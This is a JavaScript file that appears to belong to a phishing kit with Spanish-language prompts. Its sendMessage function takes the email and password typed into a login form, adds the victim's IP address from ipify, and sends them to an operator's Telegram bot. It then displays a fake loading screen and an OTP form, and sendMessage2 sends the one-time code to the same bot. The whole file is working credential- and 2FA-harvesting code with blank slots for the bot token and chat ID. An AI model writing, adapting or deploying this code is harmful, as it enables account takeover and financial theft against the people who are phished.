function sendMessage() {
    var email = document.querySelector("input[type='text']").value;
    var password = document.querySelector("input[type='password']").value;
    var botToken = '';
    var chatId = '';

    if (email.trim() === '' || password.trim() === '') {
        alert('Por favor, complete todos los campos.');
        return;
    }

    document.getElementById('loader').style.display = 'block';
    document.getElementById('login-form').style.display = 'none';
    document.getElementById('otp-form').style.display = 'none';

    setTimeout(function () {
        document.getElementById('loader').style.display = 'none';
        document.getElementById('otp-form').style.display = 'block';
    }, 10000);

    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            var ip = data.ip;
            var message = "IP: " + ip + "\n" + email + ":" + password;

            var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);

            fetch(url, { method: 'GET' })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    console.log(data);
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        })
        .catch(error => {
            console.error('Error:', error);
        });
}

function moveToNext(input) {
    if (input.value.length === input.maxLength) {
        var nextInput = input.nextElementSibling;
        if (nextInput) {
            nextInput.focus();
        }
    }
}

function sendMessage2() {
    var otpInputs = document.querySelectorAll("#otp-form input[type='number']");
    var botToken = '';
    var chatId = '';

    var isAnyEmpty = Array.from(otpInputs).some(input => input.value.trim() === '');
    if (isAnyEmpty) {
        alert('Por favor, complete todos los campos.');
        return;
    }

    var otp = Array.from(otpInputs).map(input => input.value).join("");

    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            var ip = data.ip;
            var message = "IP: " + ip + "\nCódigo OTP: " + otp;

            var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);

            fetch(url, { method: 'GET' })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    document.getElementById('otp-form').style.display = 'none';
                    return response.json();
                })
                .then(data => {
                    console.log(data);
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        })
        .catch(error => {
            console.error('Error:', error);
        });
}